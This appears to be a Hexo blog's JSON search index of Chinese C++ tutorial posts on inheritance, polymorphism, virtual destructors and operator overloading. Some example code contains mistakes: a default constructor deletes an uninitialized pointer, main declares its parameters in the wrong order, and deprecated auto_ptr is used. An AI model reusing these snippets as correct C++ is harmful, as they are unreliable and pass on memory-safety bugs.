&lt;&lt; endl; this-&gt;p = new char[64]; memset(p, 0, 64); strcpy(p, \"B string\"); &#125; //重写 virtual void print() &#123; cout &lt;&lt; p &lt;&lt; endl; &#125; virtual ~B() &#123; cout &lt;&lt; \"~B()....\" &lt;&lt; endl; if (p != NULL) &#123; delete[] p; p = NULL; &#125; &#125;private: char *p;&#125;;class C : public B&#123;public: C() &#123; cout &lt;&lt; \"C()...\" &lt;&lt; endl; this-&gt;p = new char[64]; memset(p, 0, 64); strcpy(p, \"C string\"); &#125; virtual void print() &#123; cout &lt;&lt; p &lt;&lt; endl; &#125; virtual ~C() &#123; cout &lt;&lt; \"~C()....\" &lt;&lt; endl; if (p != NULL) &#123; delete[] p; p = NULL; &#125; &#125;private: char *p;&#125;;void func(A *p)//p = cp; p = &amp;c //用父类指针指向子类对象。&#123; p-&gt;print(); //在此处发生多态。 //delete p; //delete 一个父类指针 如何让delete p不是将p看做父类指针来delete 而是当子类呢 //如果类的析构函数加上了 virtual delete 就会发生多态。 delelte p 会调用C类的析构函数&#125;void myDelete(A*p) //p-&gt;cp 父类指针指向子类对象&#123; delete p; //p-&gt;~() //如果~（） 不加virtual关键 不会发生多态。 //希望delete p， p-&gt;~() 调用C类的~（） // 如果给 所有的类的析构函数加上virtual关键字 就会发生多态。&#125;void test()&#123; C c;&#125;int main(void)&#123; /* C *cp = new C; cp-&gt;print();//cp的函数 delete cp; */ cout &lt;&lt; \" ----- \" &lt;&lt; endl; C * cp1 = new C; //发生3此构造 A() B（） C() //test(); func(cp1); myDelete(cp1); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"动态联编和静态联编","slug":"cpp0049-动态联编和静态联编","date":"2021-05-12T18:27:48.000Z","updated":"2021-05-12T18:29:58.841Z","comments":true,"path":"2021/05/13/cpp0049-动态联编和静态联编/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0049-动态联编和静态联编/","excerpt":"","text":"动态联编和静态联编","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"多态的定义和多态的三个必要条件","slug":"cpp0048-多态的定义和多态的三个必要条件","date":"2021-05-12T18:11:02.000Z","updated":"2021-05-12T18:28:32.249Z","comments":true,"path":"2021/05/13/cpp0048-多态的定义和多态的三个必要条件/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0048-多态的定义和多态的三个必要条件/","excerpt":"","text":"多态的定义和多态的三个必要条件 多态发生的三个必要条件 要有继承。 要有子类重写父类的虚函数 父类指针(或者引用) 指向子类对象。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class Hero&#123;public: //当前Hero的战斗力是10 virtual int getAd()&#123; return 10; &#125;&#125;;//超级英雄class SuperHero :public Hero&#123;public: virtual int getAd() &#123; return 100; &#125;&#125;;class BugHero : public Hero&#123;public: virtual int getAd() &#123; return 10000; &#125;&#125;;//怪兽class Monster&#123;public: int getAd() &#123; return 30; &#125;&#125;;//战斗的函数//先写的 战斗函数， 通过用父类的指针作为参数//多态具有调用未来的 意义。void PlayerFight(Hero *hero, Monster *m)&#123; //多态这种现象较 动态联编 是迟绑定 或是 晚绑定 if (hero-&gt;getAd() &gt; m-&gt;getAd()) &#123; //在此hero-&gt;getAd()就发生了多态 cout &lt;&lt; \"英雄战胜了 叫兽\" &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"英雄挂了。\" &lt;&lt; endl; &#125;&#125;int main(void)&#123; Hero hero1; Monster mon1; //后写的超级英雄 SuperHero hero2; BugHero hero3; //开始战斗 PlayerFight(&amp;hero1, &amp;mon1); PlayerFight(&amp;hero2, &amp;mon1); //Hero *hero = &amp;hero2; PlayerFight(&amp;hero3, &amp;mon1); //指针的三个必要条件 int a; int*p = NULL; p = &amp;a; *p; //多态发生的三个必要条件 //1 要有继承。 //2 要有子类重写父类的虚函数 //3 父类指针(或者引用) 指向子类对象。 //int a = 10; cin &gt;&gt; a; //func(a); // if (a &gt; 10) &#123; cout &lt;&lt; a &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"a 不大于10\" &lt;&lt; endl; &#125; return 0;&#125;/*void func(int a);void func(int a, int b);*/","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"多继承与虚继承","slug":"cpp0047-多继承与虚继承","date":"2021-05-12T17:40:38.000Z","updated":"2021-05-12T17:47:19.273Z","comments":true,"path":"2021/05/13/cpp0047-多继承与虚继承/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0047-多继承与虚继承/","excerpt":"","text":"多继承与虚继承 多继承 俗话讲的,鱼与熊掌不可兼得,而在计算机就可以实现,生成一种新的对象, 叫熊掌鱼,多继承自鱼和熊掌即可。还比如生活中,“兼”。 一个类有多个直接基类的继承关系称为多继承 沙发床实现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;//家具类class Furniture&#123;public: int m; //材质 &#125;;//如果子类虚继承本来， 编译器会将父类中的成员， 只拷贝一份。//床类class Bed: virtual public Furniture&#123;public: void sleep() &#123; cout &lt;&lt; \"在床上睡觉\" &lt;&lt; endl; &#125;&#125;;//沙发类class Sofa :virtual public Furniture&#123;public: void sit() &#123; cout &lt;&lt; \"在沙发上睡觉\" &lt;&lt; endl; &#125;&#125;;//沙发床class SofaBed :public Bed, public Sofa&#123;public: void sitAndSleep() &#123; sit();//sofa sleep();//bed &#125;&#125;;int main(void)&#123; Bed b; b.sleep(); cout &lt;&lt; \" ---- \" &lt;&lt; endl; Sofa s; //m s.m = 100; s.sit(); cout &lt;&lt; \"------- \" &lt;&lt; endl; SofaBed sb; sb.sitAndSleep(); sb.m; //多继承如果 return 0;&#125; 虚继承 如果一个派生类从多个基类派生，而这些基类又有一个共同的基类，则 在对该基类中声明的名字进行访问时，可能产生二义性","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"继承中的static","slug":"cpp0047-继承中的static","date":"2021-05-12T17:15:14.000Z","updated":"2021-05-12T18:28:44.204Z","comments":true,"path":"2021/05/13/cpp0047-继承中的static/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0047-继承中的static/","excerpt":"","text":"继承中的static 123456789101112131415161718192021222324252627282930313233#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class A&#123;public: static int s;private: &#125;;int A::s = 0;//静态成员变量要在类的外部初始化class B :public A&#123;public:private:&#125;;int main(void)&#123; B b; cout &lt;&lt; b.s &lt;&lt; endl; b.s = 100; cout &lt;&lt; b.s &lt;&lt; endl; cout &lt;&lt; A::s &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"父类和子类出现重名变量","slug":"cpp0046-父类和子类出现重名变量","date":"2021-05-12T17:04:05.000Z","updated":"2021-05-12T17:08:32.197Z","comments":true,"path":"2021/05/13/cpp0046-父类和子类出现重名变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0046-父类和子类出现重名变量/","excerpt":"","text":"父类和子类出现重名变量 1234567891011121314151617181920212223242526272829303132333435363738394041424344#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class Parent&#123;public: Parent(int a) &#123; this-&gt;a = a; &#125; int a;&#125;;class Child :public Parent&#123;public : Child(int a, int aa) : Parent(aa) &#123; this-&gt;a = a; //让Child 的a = a， 让父亲的a = aa &#125; void print() &#123; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; //默认是使用 当前类的重名的变量 cout &lt;&lt; \"Parent::a = \" &lt;&lt; Parent::a &lt;&lt; endl; //如果想访问父类中的重名变量 需要加上父类的作用域 &#125; int a; /* a ---&gt; Paretn::a */&#125;;int main(void)&#123; Child c(10, 100); c.print(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"子类中的构造和析构","slug":"cpp0045-子类中的构造和析构","date":"2021-05-12T16:56:24.000Z","updated":"2021-09-27T15:56:24.925Z","comments":true,"path":"2021/05/13/cpp0045-子类中的构造和析构/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0045-子类中的构造和析构/","excerpt":"","text":"子类中的构造和析构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;//子类在进行初始化成员变量的时候， 如果此成员变量是继承过来的， 那么需要调用父类的构造器来初始化。class Parent&#123;public: Parent(int a) &#123; this-&gt;a = a; cout &lt;&lt; \"Parent(int a) ...\" &lt;&lt; endl; &#125; ~Parent() &#123; cout &lt;&lt; \"~Parent()...\" &lt;&lt; endl; &#125; void printA() &#123; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; &#125;private: int a;&#125;;class Son :public Parent&#123;public: //子类继承于父类， 父类中的成员变量 应该用 父类的构造函数来初始化 Son(int a, int b) : Parent(a) &#123; this-&gt;b = b; cout &lt;&lt; \"Son(int a, int b) ...\" &lt;&lt; endl; &#125; ~Son() &#123; //Parent p = Parent(b);//是一个新的parent对象。 cout &lt;&lt; \"~Son() ...\" &lt;&lt; endl; &#125; void printB() &#123; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; &#125; void pirntAB() &#123; Parent::printA(); this-&gt;printB(); &#125;private: int b; char *name;&#125;;void test1()&#123; Parent p(30); Son s(20, 20); // p + s独有 s.pirntAB();&#125;int main(void)&#123; test1(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类的赋值兼容原则","slug":"cpp0044-类的赋值兼容原则","date":"2021-05-12T16:44:09.000Z","updated":"2021-05-13T21:07:58.319Z","comments":true,"path":"2021/05/13/cpp0044-类的赋值兼容原则/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0044-类的赋值兼容原则/","excerpt":"","text":"类的赋值兼容原则 类型兼容性原则 类型兼容规则是指在需要基类对象的任何地方，都可以使用公有派生类 的对象来替代。通过公有继承，派生类得到了基类中除构造函数、析构函数之 外的所有成员。这样，公有派生类实际就具备了基类的所有功能，凡是基类能 解决的问题，公有派生类都可以解决。 类型兼容规则中所指的替代包括以下情况： 在替代之后，派生类对象就可以作为基类的对象使用，但是只能使用从基类继 承的成员。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;/*子类对象可以当作父类对象使用子类对象可以直接赋值给父类对象子类对象可以直接初始化父类对象父类指针可以直接指向子类对象父类引用可以直接引用子类对象*/class Parent&#123;public: void printP() &#123; cout &lt;&lt; \"Parent::printP()...\" &lt;&lt; endl; &#125; int a;&#125;;class Child :public Parent&#123;public: void printC() &#123; cout &lt;&lt; \"Child:: printC()....\" &lt;&lt; endl; &#125; int b;&#125;;void print(Parent *p)&#123; p-&gt;printP();&#125;int main(void)&#123; Child c;//子类对象 c.printP(); //子类对象可以当作父类对象使用 Parent p = c; // 由于子类拥有全部父类的内存空间，子类能够保障父类初始化完整。 //子类对象可以直接初始化父类对象 因为子类内存空间包容的父类的，能够保证 // 完全赋值。 //Child c2 = p; //父类指针可以直接指向子类对象 //子类对象能够完全满足父类指针的需求，所以可以 父类指针可以直接指向子类对象 Parent *pp = &amp;c; //pp-&gt;printP (x ) pp-&gt;printC //pp-&gt;printC(); pp-&gt;a; //不能用子类指针指向父类对象。 //父类对象满足不了子类指针的所有需求， 所以不能够 子类指针指向父类对象。 //Child *cp = &amp;p; // cp-&gt; printP, cp-&gt;printC //cp-&gt;b; //p中没有b的内存。 //此时访问b就越界了。 //cp-&gt;printP(); //cp-&gt;printC(); //父类引用可以引用子类对象 Parent &amp;pr = c; //子类引用不可以引用父类的对象。 //Child &amp;cr = p; print(&amp;p); //Parent* p = &amp;p; print(&amp;c); //Parent *p = &amp;c; //父类指针可以指向子类对象。 return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类的继承方式","slug":"cpp0043-类的继承方式","date":"2021-05-12T16:25:34.000Z","updated":"2021-05-13T21:08:04.164Z","comments":true,"path":"2021/05/13/cpp0043-类的继承方式/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0043-类的继承方式/","excerpt":"","text":"类的继承方式 一个派生类可以同时有多个基类,这种情况称为多重继承,派生类只有一个 基类, 称为单继承。下面从单继承讲起。 继承方式 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;//基类class Parent&#123;public: //访问控制权限 int pub; //对内部外部均可以protected: int pro;//对内，外均不可以 //protected 访问控制权限下的成员 儿子可见private: int pri;//对内外 均不可以 //父亲的情人 //private 访问控制权限下的成员 儿子不可见&#125;;class Child :public Parent //Child 公有继承 Parent&#123; void func() &#123; pro; //ok//可能是私有的和保护的。 //pri; //访问不了父亲的私有成员 &#125;&#125;;//三看原则://1 看当前的成员调用是在类的外部 还是在类的内部//2 看儿子的继承方式， 是公有继承还是 私有继承//3 看当前的成员变量在父亲中的访问控制权限class Child2 : protected Parent&#123; void func() &#123; pub; //内部 //此时pub 函数 在此类中是 protected权限 //pri; &#125;&#125;;class Child3 : private Parent&#123; void func() &#123; pub; //父亲中的public 变成 本来的私有 pro;//父亲中的pro 变成本类的私有 &#125;&#125;;class SubChild3 : public Child3&#123; void func() &#123; pub; pro; &#125;&#125;;//1 基类中的私有成员 不管子类如何继承， 子类都访问不了。//2 如果是公有(public)继承， 那么基类中的访问控制权限 出了私有成员 ，在子类中保持不变//3 如果是保护继承protected ， 那么子类中出了基类的私有成员，全部是protected权限//4 如果是私有继承 private ， 父类中除了私有成员， 在子类都是 私有成员。int main(void)&#123; Parent p; p.pub; Child c; c.pub; // Child c;// c.pro; // //c.pro; //此时pro 可能是私有的 也可能是保护的。 Child2 c2; //c2.pub; //c2.pro; //此时pro 在Child2中是一个保护权限， 在类的外部访问不了。 Child3 c3; c3.pub; c3.pro; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"有关继承的名词定义","slug":"cpp0042-有关继承的名词定义","date":"2021-05-12T16:22:59.000Z","updated":"2021-05-12T16:24:58.025Z","comments":true,"path":"2021/05/13/cpp0042-有关继承的名词定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/13/cpp0042-有关继承的名词定义/","excerpt":"","text":"有关继承的名词定义 类的继承,是新的类从已有类那里得到已有的特性。或从已有类产生新类 的过程就是类的派生。原有的类称为基类或父类,产生的新类称为派生类或子类。 派生与继承,是同一种意义两种称谓。 isA 的关系。 派生类的组成 派生类中的成员,包含两大部分,一类是从基类继承过来的,一类是自己增加 的成员。从基类继承过过来的表现其共性,而新增的成员体现了其个性。","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类与类之间的关系","slug":"cpp0041-类与类之间的关系","date":"2021-05-11T17:26:35.000Z","updated":"2021-05-11T17:29:39.099Z","comments":true,"path":"2021/05/12/cpp0041-类与类之间的关系/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/12/cpp0041-类与类之间的关系/","excerpt":"","text":"类与类之间的关系 B has A 代表 B依赖A C use A 代表C使用A D is A 代表D包含了A 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class A&#123;public: void funcA() &#123; cout &lt;&lt; \"func A ...\" &lt;&lt; endl; &#125;&#125;;//A对于B类 是充当一个成员变量， B has A 包含关系 A 属于Bclass B&#123;public: void funcB() &#123; a.funcA(); &#125; A a;&#125;;//如果C中某一个成员函数 是依赖于A类形参， 将A类当一个形参传递进来//C use Aclass C&#123;public: void funcC(A *a) &#123; a-&gt;funcA(); &#125;&#125;;//类D 继承于 类A//类D 继承于A 就说明 D is Aclass D : public A&#123;public: void funcD() &#123; funcA(); //直接使用A类的方法。 &#125;&#125;;int main(void)&#123; D d; d.funcA(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"自定义智能指针和重载相关操作符","slug":"cpp0040-自定义智能指针和重载相关操作符","date":"2021-05-11T16:42:23.000Z","updated":"2021-05-12T19:22:34.099Z","comments":true,"path":"2021/05/12/cpp0040-自定义智能指针和重载相关操作符/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/12/cpp0040-自定义智能指针和重载相关操作符/","excerpt":"","text":"自定义智能指针和重载相关操作符 智能指针 123456789101112131415161718192021222324252627282930313233343536373839404142#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;memory&gt;using namespace std;class A&#123;public: A(); ~A(); A(int x) &#123; a = x; &#125; void printf() &#123; cout &lt;&lt; a &lt;&lt; endl; &#125;private: int a;&#125;;A::A()&#123; cout &lt;&lt; \"A()...\" &lt;&lt; endl;&#125;A::~A()&#123; cout &lt;&lt; \"~A()...\" &lt;&lt; endl;&#125;void test() &#123; //智能指针,不需要手动delete auto_ptr&lt;A&gt; a(new A(10)); a-&gt;printf();&#125;int main(char *argv[], int argc)&#123; test(); return 0;&#125; 自定义智能指针和重载-&gt; *操作符 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); A(int x) &#123; a = x; cout &lt;&lt; \"A(int x)..\" &lt;&lt; endl; &#125; ~A(); int getA() &#123; return a; &#125;private: int a;&#125;;//自定义智能指针类class MyPtr&#123;public: MyPtr(); MyPtr(A * tPtr) &#123; ptr = tPtr; &#125; //重载-&gt;操作符 A * operator-&gt;() &#123; return ptr; &#125; //重载*操作符 A &amp; operator*() &#123; return *ptr; &#125; ~MyPtr();private: A * ptr;&#125;;MyPtr::MyPtr()&#123; ptr = NULL;&#125;MyPtr::~MyPtr()&#123; if (ptr != NULL) &#123; delete ptr; ptr = NULL; &#125;&#125;A::A()&#123; cout &lt;&lt; \"A()...\" &lt;&lt; endl;&#125;A::~A()&#123; cout &lt;&lt; \"~A()...\" &lt;&lt; endl;&#125;void test1() &#123; MyPtr mP(new A(20)); cout &lt;&lt; mP-&gt;getA() &lt;&lt; endl; cout &lt;&lt; (*mP).getA() &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test1(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"不建议重载并且和或者操作符","slug":"cpp0039-不建议重载并且和或者操作符","date":"2021-05-11T16:01:04.000Z","updated":"2021-05-11T16:20:16.273Z","comments":true,"path":"2021/05/12/cpp0039-不建议重载并且和或者操作符/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/12/cpp0039-不建议重载并且和或者操作符/","excerpt":"","text":"不建议重载并且和或者操作符 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); A(int x); ~A(); A &amp; setValue(int x); int getValue() &#123; return value; &#125; bool operator&amp;&amp;(const A &amp; ta); bool operator||(const A &amp; ta);private: int value;&#125;;A::A(int x)&#123; value = x;&#125;A &amp; A::setValue(int x)&#123; value = x; return *this;&#125;bool A::operator||(const A &amp; ta)&#123; cout &lt;&lt; \"重载了||运算符\" &lt;&lt; endl; if (value != 0 || ta.value != 0) &#123; return true; &#125; return false;&#125;bool A::operator&amp;&amp;(const A &amp; ta)&#123; cout &lt;&lt; \"重载了&amp;&amp;运算符\" &lt;&lt; endl; if (value != 0 &amp;&amp; ta.value != 0) &#123; return true; &#125; return false;&#125;A::A()&#123;&#125;A::~A()&#123;&#125;int main(char *argv[], int argc)&#123; A a(0), b(20); int i = 0, j = 20; //不会发生短路现象 if (a &amp;&amp; b) &#123; cout &lt;&lt; \"a &amp;&amp; b == true\" &lt;&lt; endl; &#125; if (b || a.setValue(100)) &#123; cout &lt;&lt; \"a &amp;&amp; b == true\" &lt;&lt; endl; &#125; //因为b不等于0 ,正常情况下a.setValue(100)是不会执行的,所以重载了||不会发生短路 cout &lt;&lt; a.getValue() &lt;&lt; endl; //正常发生短路,所以i和j的值不变 if (i &amp;&amp; (j = 100)); cout &lt;&lt; \"j = \" &lt;&lt; j &lt;&lt; endl; if (j || (i=20)); cout &lt;&lt; \"i = \" &lt;&lt; i &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"重载函数调用符号(仿函数)","slug":"cpp0038-重载函数调用符号-仿函数","date":"2021-05-11T15:35:37.000Z","updated":"2021-05-11T16:20:25.049Z","comments":true,"path":"2021/05/11/cpp0038-重载函数调用符号-仿函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/11/cpp0038-重载函数调用符号-仿函数/","excerpt":"","text":"重载函数调用符号(仿函数) 1234567891011121314151617181920212223242526272829303132333435#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); ~A(); //重载一个伪函数 int operator()(int value) &#123; return value * value; &#125;private: int a;&#125;;A::A()&#123;&#125;A::~A()&#123;&#125;int main(char *argv[], int argc)&#123; A a; cout &lt;&lt; a(2) &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"重载new和delete","slug":"cpp0037-重载new和delete","date":"2021-05-11T15:07:33.000Z","updated":"2021-05-11T16:19:52.401Z","comments":true,"path":"2021/05/11/cpp0037-重载new和delete/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/11/cpp0037-重载new和delete/","excerpt":"","text":"重载new和delete 声明语法 12345void * operator new(size_t size);void * operator new[](size_t size);void operator delete[](void *p);void operator delete(void * p); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class A&#123;public: A(); A(int t) &#123; test = t; &#125; ~A(); /* 重载了new 和 delete后,一样会调用构造函数和析构函数 */ void * operator new(size_t size); void * operator new[](size_t size); void operator delete[](void *p); void operator delete(void * p);private: size_t _size; int test;&#125;;void A::operator delete[](void * p)&#123; free(p);&#125;void * A::operator new[](size_t size)&#123; return malloc(size);&#125;void A::operator delete(void * p)&#123; free(p);&#125;void * A::operator new(size_t size)&#123; cout &lt;&lt; size &lt;&lt; endl; return malloc(size);&#125;A::A()&#123; cout &lt;&lt; \"A()...\" &lt;&lt; endl;&#125;A::~A()&#123; cout &lt;&lt; \"~A()...\" &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; A * a = new A();//a.operator new(sizeof(A)) //初始化一个new A数组 A * b = new A[10]&#123;(10),(20),(30)&#125;; delete[] b; delete a; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"重载数组下标运算符","slug":"cpp0036-重载数组下标运算符","date":"2021-05-11T14:36:36.000Z","updated":"2021-05-11T14:50:15.037Z","comments":true,"path":"2021/05/11/cpp0036-重载数组下标运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/11/cpp0036-重载数组下标运算符/","excerpt":"","text":"重载数组下标运算符 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class ArrayInt&#123;public: ArrayInt(); ArrayInt(int x); //重载数组下标操作符 int &amp; operator[](int x); int getSize() &#123; return size; &#125; ~ArrayInt();private: int * array; int size;&#125;;//重载数组下标操作符int &amp; ArrayInt::operator[](int x)&#123; return array[x];&#125;ArrayInt::ArrayInt(int x)&#123; size = x; array = new int[size];&#125;ArrayInt::ArrayInt()&#123; if (array != NULL) &#123; delete[] array; size = 0; &#125;&#125;ArrayInt::~ArrayInt()&#123;&#125;int main(char *argv[], int argc)&#123; ArrayInt num(300); for (int i = 0; i &lt; num.getSize(); i++) &#123; num[i] = i; &#125; for (int i = 0; i &lt; num.getSize(); i++) &#123; cout &lt;&lt; num[i] &lt;&lt; \" \"; if (i % 10 == 0 &amp;&amp; i != 0) cout &lt;&lt; endl; &#125; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"等号操作符重载","slug":"cpp0035-等号操作符重载","date":"2021-05-11T14:24:40.000Z","updated":"2021-05-11T14:26:12.853Z","comments":true,"path":"2021/05/11/cpp0035-等号操作符重载/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/11/cpp0035-等号操作符重载/","excerpt":"","text":"等号操作符重载 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class Student&#123;public: Student(); Student(const char * tname); Student(const Student &amp; s); ~Student(); //重载赋值运算符 Student &amp; operator=(const Student &amp; s); friend ostream &amp; operator&lt;&lt;(ostream &amp; cout ,const Student &amp; s); static long long sid;private: char * name; int nameLen; long long id;&#125;;long long Student::sid = 10000000;//操作赋值操作符Student &amp; Student::operator=(const Student &amp; s)&#123; //首先判断是不是本身 if (&amp;s == this) &#123; return *this; &#125; //判断是否为空,如果不为空,就将自身开辟的空间释放掉 if (this-&gt;name != NULL) &#123; delete[] this -&gt; name; this -&gt; name = NULL; &#125; //执行深拷贝 this-&gt;nameLen = s.nameLen; this -&gt; name = new char[this-&gt;nameLen + 1]; strcpy(this-&gt;name,s.name); this-&gt;id = s.id; return *this;&#125;//拷贝构造函数Student::Student(const Student &amp; s)&#123; nameLen = s.nameLen; id = s.id; cout &lt;&lt; Student::sid &lt;&lt; endl; if (s.name == NULL) &#123; name = NULL; return; &#125; name = new char[nameLen + 1]; strcpy(name, s.name);&#125;ostream &amp; operator&lt;&lt;(ostream &amp; cout, const Student &amp; s)&#123; if (s.name == NULL) &#123; cout &lt;&lt; \"学号为\"&lt;&lt;s.id&lt;&lt;\"该学生无效\" &lt;&lt; endl; return cout; &#125; cout &lt;&lt;\"姓名:\" &lt;&lt; s.name &lt;&lt; endl; cout &lt;&lt;\"学号:\" &lt;&lt; s.id &lt;&lt; endl; cout &lt;&lt; \"====================\" &lt;&lt; endl; return cout;&#125;Student::Student(const char * tname)&#123; nameLen = strlen(tname); id = ++sid; name = new char[nameLen + 1]; strcpy(name,tname);&#125;Student::Student()&#123; name = NULL; nameLen = 0; id = ++sid;&#125;Student::~Student()&#123; if (sid &gt; 10000000) &#123; --sid; &#125; if (name != NULL) &#123; cout &lt;&lt; name &lt;&lt; \" 0x\" &lt;&lt; (int *)name &lt;&lt; \" 已被析构\" &lt;&lt; endl; delete[] name; name = NULL; &#125;else cout &lt;&lt; \"NULL\" &lt;&lt; \" 0x\" &lt;&lt; (int *)name &lt;&lt; \" 已被析构\" &lt;&lt; endl; &#125;int main(char *argv[], int argc)&#123; Student s1, s2(\"XiaoMing\"); cout &lt;&lt; s1 &lt;&lt; s2 &lt;&lt; endl; s1 = s2; cout &lt;&lt; s1 &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"左移右移操作符重载","slug":"cpp0034-左移右移操作符重载","date":"2021-05-11T12:30:59.000Z","updated":"2021-05-11T14:37:18.989Z","comments":true,"path":"2021/05/11/cpp0034-左移右移操作符重载/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/11/cpp0034-左移右移操作符重载/","excerpt":"","text":"左移右移操作符重载 重载左移 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class C&#123;public: C(); C(int ta,int tb); ~C(); //友元重载左移&lt;&lt;运算符 friend ostream &amp; operator&lt;&lt;(ostream &amp; cout, const C &amp; another);private: int a; int b;&#125;;//友元重载左移&lt;&lt;运算符ostream &amp; operator&lt;&lt;(ostream &amp; cout, const C &amp; another)&#123; cout &lt;&lt; another.a &lt;&lt; endl; cout &lt;&lt; another.b &lt;&lt; endl; cout &lt;&lt; \"==================\" &lt;&lt; endl; return cout;&#125;C::C(int ta, int tb)&#123; a = ta; b = tb;&#125;C::C()&#123;&#125;C::~C()&#123;&#125;int main(char *argv[], int argc)&#123; C a(1, 2),b(2,3); cout &lt;&lt; a &lt;&lt; b; return 0;&#125; 重载右移 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;using namespace std;class 